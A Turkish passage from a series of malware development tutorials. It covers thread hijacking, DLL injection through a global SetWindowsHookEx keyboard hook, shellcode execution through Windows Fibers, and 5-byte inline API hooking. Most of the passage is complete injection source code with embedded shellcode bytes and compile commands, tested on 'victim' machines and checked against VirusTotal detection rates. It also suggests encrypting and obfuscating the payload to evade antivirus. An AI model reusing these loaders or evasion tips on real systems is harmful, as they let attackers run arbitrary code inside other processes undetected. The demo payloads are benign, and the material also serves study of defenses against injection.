Bir sonraki adımda, hedef süreçte ele geçirmek istediğimiz iş parçacığının ID’ni buluyoruz. Bizim durumumuzda, hedef sürecin ilk iş parçacığının kimliğini alacağız. Bunun için `CreateToolhelp32Snapshot` kullanarak hedef sürecin iş parçacıklarının bir anlık görüntüsünü oluşturuyoruz ve `Thread32Next` ile iş parçacıklarını sıralıyoruz. Bu bize ele geçireceğimiz iş parçacığının ID’ni verecek:
++++++++++++++++++++++
Daha sonra, ele geçirmek istediğimiz hedef iş parçacığını askıya alıyoruz:  
+++++++++++++++++++++++++++++++
Ardından, hedef iş parçacığının bağlamını alıyoruz: 
+++++++++++++++++
Hedef iş parçacığının `RIP` (64-bit'teki komut işaretçisi) kaydını payload'a işaret edecek şekilde güncelliyoruz:  
+++++++++++++++++++++++++++
Ancak, burada 'SetThreadContext anomaly' (SetThreadContext anomalisi) adı verilen bir sorun vardır. Bazı süreçler için, değişken kayıtlar (`RAX`, `RCX`, `RDX`, `R8-R11`) `SetThreadContext` ile ayarlanır, ancak diğer süreçler (örneğin Explorer, Edge) için göz ardı edilir. Bu kayıtları ayarlamak için `SetThreadContext`'e güvenmemek en iyisidir. 
Ele geçirilen iş parçacığını onaylıyoruz: 
++++++++++++++++++++++++++++++++++
Ve bir sonraki adımda ele geçirilen iş parçacığını devam ettiriyoruz:
+++++++++++++++++++++++++++++++++++++ 
Gördüğünüz gibi, bu çok da zor değil. Şimdi bu zararlı yazılım kodunu derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive >/dev/null 2>&1
Kurban makinede önce bir notepad.exe oturumu başlatalım ve ardından programımızı çalıştıralım:
.\hack.exe notepad.exe
+++++++++++++++++++++++++++++++++++++
Ve payload kodumuz, kurban süreci (notepad.exe) kapandıktan sonra bile çalışmaya devam ediyor:
++++++++++++++++++++++++++++++
Gördüğünüz gibi, mantığımız mükemmel bir şekilde çalıştı!
Thread execution hijacking(https://attack.mitre.org/techniques/T1055/003/)
CreateToolhelp32Snapshot(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
Process32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
Process32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
Strcmp(https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-160)
Taking a Snapchot and Viewing Processes(https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
Thread32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first)
Thread32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next)
CloseHandle(https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
SuspendThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
GetThreadContext(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
SetThreadContext(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
ResumeThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
“Classic” code injection(https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html)
“Classic” DLL injection(https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)
Github’taki kaynak kod:(https://github.com/cocomelonc/2021-11-23-malware-injection-6)
17. SetWindowsHookEx ile Klasik DLL Enjeksiyonu. Basit C++ Zararlı Yazılım.
Bismillah
Bu eğitimde, `SetWindowsHookEx` yöntemiyle DLL enjeksiyonunu inceleyeceğim."**
SetWindowsHookEx
Bu tekniği gösteren bir örneğe bakalım. `SetWindowsHookEx`, bir kanca zincirine bir kanca işlevi kurar ve belirli olaylar tetiklendiğinde çağrılır. İşlev söz dizimine bakalım:
HHOOK SetWindowsHookExA(
[in] int idHook,
[in] HOOKPROC lpfn,
[in] HINSTANCE hmod,
[in] DWORD dwThreadId
);
Buradaki en önemli parametre `idHook`'dur. Yüklenecek kancanın türünü belirler ve aşağıdaki değerlerden birini alabilir:
WH_CALLWNDPROC
WH_CALLWNDPROCRET
WH_CBT
WH_DEBUG
WH_FOREGROUNDIDLE
WH_GETMESSAGE
WH_JOURNALPLAYBACK
WH_JOURNALRECORD
WH_KEYBOARD
WH_KEYBOARD_LL
WH_MOUSE
WH_MOUSE_LL
WH_MSGFILTER
WH_SHELL
WH_SYSMSGFILTER
Bizim durumumuzda, tuş vuruşu mesajlarını izlememize olanak tanıyan `WH_KEYBOARD` türündeki bir olayı kancalayacağım.
Zararlı DLL
Zararlı DLL'imizi hazırlayalım. Basitlik adına, yalnızca bir mesaj kutusu açan bir DLL oluşturuyoruz:
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/25/malware-injection-7.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD nReason, LPVOID lpReserved) {
	switch (nReason) {
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) int Meow() {
	MessageBox(
		NULL,
		"Meow from evil.dll!",
		"=^..^=",
		MB_OK
	);
	return 0;
}
Gördüğünüz gibi, oldukça basit bir DLL'imiz var. DllMain() işlevi, DLL sürecin adres alanına yüklendiğinde çağrılır. Ayrıca Meow() adlı bir işlev var, bu işlev dışa aktarılan bir işlevdir ve sadece 'Meow from evil.dll!' mesajını gösterir.
Örnek. Basit Zararlı Yazılım.
Bir sonraki adım, zararlı yazılımımızı oluşturmaktır. Kaynak koduna bakalım:
/*
hack.cpp
DLL inject via SetWindowsHookEx
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/25/malware-injection-7.html
*/
#include <windows.h>
#include <cstdio>

typedef int (__cdecl *MeowProc)();

int main(void) {
	HINSTANCE meowDll;
	MeowProc meowFunc;
	// load evil DLL
	meowDll = LoadLibrary(TEXT("evil.dll"));

	// get the address of exported function from evil DLL
	meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");

	// install the hook - using the WH_KEYBOARD action
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)meowFunc, meowDll, 0);
	Sleep(5*1000);
	UnhookWindowsHookEx(hook);
	return 0;
}
Gördüğünüz gibi, oldukça basit. İlk olarak, zararlı DLL'imizi yüklemek için `LoadLibrary` işlevini çağırıyoruz:
+++++++++++++++++++++
Daha sonra, dışa aktarılan 'Meow' işlevinin adresini almak için `GetProcAddress` işlevini çağırıyoruz:
+++++++++++++++++++++++
Ardından, zararlı yazılımımız en önemli işlevi, `SetWindowsHookEx` işlevini çağırır. Bu işlevin aldığı parametreler, işlevin aslında ne yapacağını belirler:
++++++++++++++++++++++++++
Gördüğünüz gibi, klavye olayı gerçekleştiğinde, işlevimiz çağrılacaktır. Ayrıca, dışa aktarılan işlevimizin adresini (`meowFunc` parametresi) ve DLL'imizin işleyicisini (`meowDll` parametresi) geçiyoruz. Son parametre olan 0, yalnızca belirli bir programı değil, tüm programları kancalamak istediğimizi belirtir, yani bu bir global kanca olur.
Daha sonra, kancamızın çalıştığını göstermek için Sleep işlevini çağırıyoruz:
++++++++++++++++++++++++++
Ve ardından, daha önce kancalanmış olan `WH_KEYBOARD` olayını kaldırmak için `UnhookWindowsHookEx()` işlevini çağırıyoruz:
+++++++++++++++++++++
Son olarak, zararlı yazılım kodunun tamamını anladıktan sonra, bunu test edebiliriz. 
İlk olarak, zararlı DLL'i derleyelim:
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive
+++++++++++++++++++++++++++++
Daha sonra zararlı yazılım kodunu derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
+++++++++++++++++++++++++++++++
Şimdi, her şeyi eylemde görmek için hack.exe'yi kurban makinede başlatalım (benim durumumda Windows 7 x64):
.\hack.exe
+++++++++++++++++++++++++++++++
Görüyoruz ki, her şey başarıyla tamamlandı ve bu noktada, bir program başlattığımızda, yalnızca klavye tuşuna basıldığında mesajımız açılıyor.
Sonuç
Bu bölümde, `SetWindowsHookEx` işlevini kullanarak bir DLL'i bir sürecin adres alanına nasıl enjekte edebileceğimizi ve bu adres alanında rastgele kod nasıl çalıştırabileceğimizi gösterdim.
Ancak, bu tekniğin bir sınırlaması vardır. Bu teknik, benim Windows 10 x64 makinemde çalışmıyor. Bunun nedeni şu olabilir: CIG bu tekniği engelliyor. Windows 10 x64 iki önemli özelliğe sahiptir:
- CFG (Control Flow Guard) – Onaylanmamış adreslere dolaylı çağrıları engeller.
- CIG (Code Integrity Guard) - Yalnızca Microsoft/Microsoft Store/WHQL tarafından imzalanmış modüllerin süreç belleğine yüklenmesine izin verir.

BlackHat USA 2019'daki bu sunumda, yazarlar CIG'nin bu tekniği nasıl engellediğini açıklıyor.
Şimdi hack.exe dosyamızı virustotal'a yükleyelim:
 https://www.virustotal.com/gui/file/273e191999eb6a4bc010eeaf9c4e196d91750925
0f87a121fa1cfeded41b7921
Gördüğünüz gibi, 67 antivirüs motorundan 5 tanesi dosyamızı zararlı olarak algıladı.
BlackHat USA 2019 process injection techniques Gotta Catch Them All(https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf)
SetWindowsHookEx(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
Using Hooks MSDN(https://docs.microsoft.com/en-us/windows/win32/winmsg/using-hooks)
Exporting from a DLL(https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-11-24-malware-injection-7
18. Windows Fibers ile Kod Enjeksiyonu. Basit C++ Zararlı Yazılım. 
Bismillah
Bu yazıda, Windows Fibers API aracılığıyla yerel sürece kod enjeksiyonunu inceleyeceğim.
Fiber nedir? Bir fiber, uygulama tarafından manuel olarak zamanlanması gereken bir yürütme birimidir. Fiberler, onları zamanlayan iş parçacıklarının bağlamında çalışır. 
Örnek
Bu tekniği gösteren bir örneği ele alalım.
İlk olarak, ilk fiberi zamanlamadan önce fiber durumu bilgilerini saklamak için bir alan oluşturmak adına `ConvertThreadToFiber` işlevini çağırıyoruz:
++++++++++++++++++++++++++++++++++++
Ardından, payload’ımız için biraz bellek tahsis edin ve payload’ı bu tahsis edilen belleğe yazın:
+++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, `VirtualAlloc` işlevi, çalıştırılabilir, okunabilir ve yazılabilir anlamına gelen `PAGE_EXECUTE_READWRITE` parametresiyle çağrıldı.
Bir sonraki adım, payload’ımızı çalıştıracak bir fiber oluşturmaktır:
++++++++++++++++++++++++++++++++++++++++++++++++
Son olarak, payload’ımızı işaret eden yeni oluşturulan fiberi zamanlayın:
+++++++++++++++++++++++
Yani, tam kaynak kodumuz şu şekilde (hack.cpp):
/*
hack.cpp
code inject via fibers
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/28/malware-injection-8.html
*/
#include <windows.h>
unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
	0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int my_payload_len = sizeof(my_payload);
int main() {
	PVOID f; // converted
	PVOID payload_mem; // memory buffer for payload
	PVOID payloadF; // fiber

	// convert main thread to fiber
	f = ConvertThreadToFiber(NULL);

	// allocate memory buffer
	payload_mem = VirtualAlloc(0, my_payload_len,
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(payload_mem, my_payload, my_payload_len);

	// create a fiber that will execute payload
	payloadF = CreateFiber(NULL,
	(LPFIBER_START_ROUTINE)payload_mem,
	NULL);

	SwitchToFiber(payloadF);
	return 0;
}
Basitlik adına, yük olarak 64-bit calc.exe kullanıyoruz.Payload’ın oluşturulma detaylarına girmeden, payload’ı doğrudan kodumuza yerleştiriyoruz:
unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
	0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
Şimdi basit zararlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

++++++++++++++++++++++++++++++++++++
Ardından hack.exe'yi Windows 7 x64 üzerinde başlatalım:
.\hack.exe
+++++++++++++++++++++++++++++++++++
Ayrıca Windows 10 x64 (build 18363) üzerinde de mükemmel çalıştı:
++++++++++++++++++++++++++++++++++++
Şimdi zararlı yazılımımızı virustotal'a yükleyelim:
++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/f03bdb9fa52f7b61ef03141fefff1498ad2612740b
1fdbf6941f1c5af5eee70a?nocache=1
Gördüğünüz gibi, 67 antivirüs motorundan 25 tanesi dosyamızı zararlı olarak algıladı.
Daha iyi sonuçlar için, payload şifrelemesini rastgele bir anahtar ile birleştirebilir ve işlevleri başka anahtarlarla gizleyebilirsiniz.
Ayrıca, payload şifrelemesi için AES şifrelemesi kullanabiliriz.
BlackHat USA 2019 process injection techniques Gotta Catch Them All(https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf)
MSDN Fibers(https://docs.microsoft.com/en-us/windows/win32/procthread/fibers)
VirtualAlloc(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
ConvertThreadToFiber(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertthreadtofiber)
CreateFiber(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiber)
SwitchToFiber(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-switchtofiber)
Memcpy(https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-11-26-malware-injection-8

19. Windows API Hooking. Basit C++ Örneği
Bismillah
++++++++++++++++++++++++++++
API Hooking nedir?
API hooking, API çağrılarının davranışını ve akışını enstrüman etmek ve değiştirmek için kullanılan bir tekniktir. Bu teknik, zararlı kodun algılanıp algılanmadığını belirlemek için birçok antivirüs çözümü tarafından da kullanılır.
Örnek 1
Windows API işlevlerini hooklamadan önce, bir DLL'den dışa aktarılan bir işlevle bunu nasıl yapacağımızı ele alacağım.
Örneğin, şu mantığa sahip bir DLL'imiz var (pet.cpp):
/*
pet.dll - DLL example for basic hooking
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		}
		return TRUE;
	}

extern "C" {
	__declspec(dllexport) int _cdecl Cat(LPCTSTR say) {
		MessageBox(NULL, say, "=^..^=", MB_OK);
		return 1;
		}
	}

extern "C" {
	__declspec(dllexport) int _cdecl Mouse(LPCTSTR say) {
		MessageBox(NULL, say, "<:3()~~", MB_OK);
		return 1;
	}
}

extern "C" {
	__declspec(dllexport) int _cdecl Frog(LPCTSTR say) {
		MessageBox(NULL, say, "8)~", MB_OK);
		return 1;
	}
}

extern "C" {
	__declspec(dllexport) int _cdecl Bird(LPCTSTR say) {
		MessageBox(NULL, say, "<(-)", MB_OK);
		return 1;
	}
}
Gördüğünüz gibi, bu DLL en basit dışa aktarılan işlevlere sahip: Cat, Mouse, Frog, Bird, her biri bir sayparametresi alıyor. Bu işlevlerin mantığı oldukça basittir; sadece bir başlıkla birlikte bir mesaj açarlar.
Şimdi bunu derleyelim:
x86_64-w64-mingw32-gcc -shared -o pet.dll pet.cpp -fpermissive
+++++++++++++++++++++++++++

Daha sonra, bu DLL'i doğrulamak için basit bir kod oluşturuyoruz (cat.cpp):
#include <windows.h>

typedef int (__cdecl *CatProc)(LPCTSTR say);
typedef int (__cdecl *BirdProc)(LPCTSTR say);

int main(void) {
	HINSTANCE petDll;
	CatProc catFunc;
	BirdProc birdFunc;
	BOOL freeRes;

	petDll = LoadLibrary("pet.dll");
	if (petDll != NULL) {
		catFunc = (CatProc) GetProcAddress(petDll, "Cat");
		birdFunc = (BirdProc) GetProcAddress(petDll, "Bird");
		if ((catFunc != NULL) && (birdFunc != NULL)) {
			(catFunc) ("meow-meow");
			(catFunc) ("mmmmeow");
			(birdFunc) ("tweet-tweet");
		}
		freeRes = FreeLibrary(petDll);
	}
	return 0;
}

Haydi şunu derleyelim:

x86_64-w64-mingw32-g++ -O2 cat.cpp -o cat.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++

Ve,Windows 7 x64’te başlatalım:
.\cat.exe

+++++++++++++++++++++++++
+++++++++++++++++++++++++
++++++++++++++++++++++++

Ve gördüğünüz gibi, her şey beklendiği gibi çalışıyor. 

Bu senaryoda, örneğin Cat işlevi hooklanacak, ancak bu herhangi bir işlev olabilir.  

Bu tekniğin iş akışı şu şekildedir: 

Öncelikle, Cat işlevinin bellek adresini alın.
++++++++++++++++++++++++++++++++  

sonra, Cat işlevinin ilk 5 baytını kaydedin. Bu baytları daha sonra kullanacağız:
++++++++++++++++++++++++++++++++  

daha sonra, orijinal Cat işlevi çağrıldığında çalıştırılacak bir myFunc işlevi oluşturun: 
+++++++++++++++++++++++++++++++++

İlk 5 baytı myFunc işlevine bir atlama (jmp) ile değiştirin:
++++++++++++++++++++++++++++++++++  

Sonrasında, bir 'patch' oluşturun:
++++++++++++++++++++++++++++++++++++

Bir sonraki adımda, Cat işlevimizi yamalayın (Cat işlevini `myFunc` işlevine yönlendirin): 
++++++++++++++++++++++++++++++++++ 

Burada ne yaptık? Bu numara 'klasik 5-bayt hook' tekniğidir. Eğer işlevi ayrıştırırsak:
++++++++++++++++++++++++++++++++++++

Vurgulanan 5 bayt, birçok API işlevinde bulunan oldukça tipik bir başlangıçtır. Bu ilk 5 baytı bir `jmp` talimatıyla değiştirerek, yürütmeyi tanımladığımız kendi işlevimize yönlendiriyoruz. Orijinal baytları daha sonra, yürütmeyi tekrar hooklanan işlevimize geçirmek istediğimizde başvurabilmek için saklıyoruz.

Bu nedenle, önce orijinal Cat işlevini çağırırız, hookumuzu ayarlarız ve ardından tekrar Cat'i çağırırız:
+++++++++++++++++++++++++++++++++++++++

Tam kaynak kodu şu şekilde:  
/*
hooking.cpp
basic hooking example
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/30/basic-hooking-1.html
*/
#include <windows.h>

typedef int (__cdecl *CatProc)(LPCTSTR say);

// buffer for saving original bytes
char originalBytes[5];

FARPROC hookedAddress;

// we will jump to after the hook has been installed
int __stdcall myFunc(LPCTSTR say) {
	HINSTANCE petDll;
	CatProc catFunc;

	// unhook the function: rewrite original bytes
	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress,
	originalBytes, 5, NULL);

	// return to the original function and modify the text
	petDll = LoadLibrary("pet.dll");
	catFunc = (CatProc) GetProcAddress(petDll, "Cat");

	return (catFunc) ("meow-squeak-tweet!!!");
}

// hooking logic
void setMySuperHook() {
	HINSTANCE hLib;
	VOID *myFuncAddress;
	DWORD *rOffset;
	DWORD src;
	DWORD dst;
	CHAR patch[5]= {0};

	// get memory address of function Cat
	hLib = LoadLibraryA("pet.dll");
	hookedAddress = GetProcAddress(hLib, "Cat");

	// save the first 5 bytes into originalBytes (buffer)
	ReadProcessMemory(GetCurrentProcess(),
	(LPCVOID) hookedAddress,
	originalBytes, 5, NULL);

	// overwrite the first 5 bytes with a jump to myFunc
	myFuncAddress = &myFunc;

	// will jump from the next instruction
	// (after our 5 byte jmp instruction)
	src = (DWORD)hookedAddress + 5;

	dst = (DWORD)myFuncAddress;
	rOffset = (DWORD *)(dst-src);

	// \xE9 - jump instruction
	memcpy(patch, "\xE9", 1);
	memcpy(patch + 1, &rOffset, 4);

	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, patch,
	5, NULL);
}

int main() {
	HINSTANCE petDll;
	CatProc catFunc;

	petDll = LoadLibrary("pet.dll");
	catFunc = (CatProc) GetProcAddress(petDll, "Cat");

	// call original Cat function
	(catFunc)("meow-meow");

	// install hook
	setMySuperHook();

	// call Cat function after install hook
	(catFunc)("meow-meow");
}

Haydi bunu derleyelim:

x86_64-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++

Ve bunu eylemde görelim (bu durumda Windows 7 x64 üzerinde):

.\hooking.exe

+++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, hookumuz mükemmel bir şekilde çalıştı!! Cat artık meow-meow yerine meow-squeak-tweet yapıyor!!!
Örnek 2
Benzer şekilde, kernel32.dll içindeki WinExec gibi bir işlevi hooklayabilirsiniz (hooking2.cpp):
#include <windows.h>

// buffer for saving original bytes
char originalBytes[5];

FARPROC hookedAddress;

// we will jump to after the hook has been installed
int __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {

	// unhook the function: rewrite original bytes
	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, originalBytes, 5, NULL);

	// return to the original function and modify the text
	return WinExec("calc", uCmdShow);
}

// hooking logic
void setMySuperHook() {
	HINSTANCE hLib;
	VOID *myFuncAddress;
	DWORD *rOffset;
	DWORD src;
	DWORD dst;
	CHAR patch[5]= {0};

	// get memory address of function MessageBoxA
	hLib = LoadLibraryA("kernel32.dll");
	hookedAddress = GetProcAddress(hLib, "WinExec");

	// save the first 5 bytes into originalBytes (buffer)
	ReadProcessMemory(GetCurrentProcess(),
	(LPCVOID) hookedAddress, originalBytes, 5, NULL);

	// overwrite the first 5 bytes with a jump to myFunc
	myFuncAddress = &myFunc;

	// will jump from the next instruction
	// (after our 5 byte jmp instruction)
	src = (DWORD)hookedAddress + 5;
	dst = (DWORD)myFuncAddress;
	rOffset = (DWORD *)(dst-src);

	// \xE9 - jump instruction
	memcpy(patch, "\xE9", 1);
	memcpy(patch + 1, &rOffset, 4);

	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, patch, 5, NULL);
}

int main() {

	// call original
	WinExec("notepad", SW_SHOWDEFAULT);

	// install hook
	setMySuperHook();

	// call after install hook
	WinExec("notepad", SW_SHOWDEFAULT);
}

Şunu derleyelim:

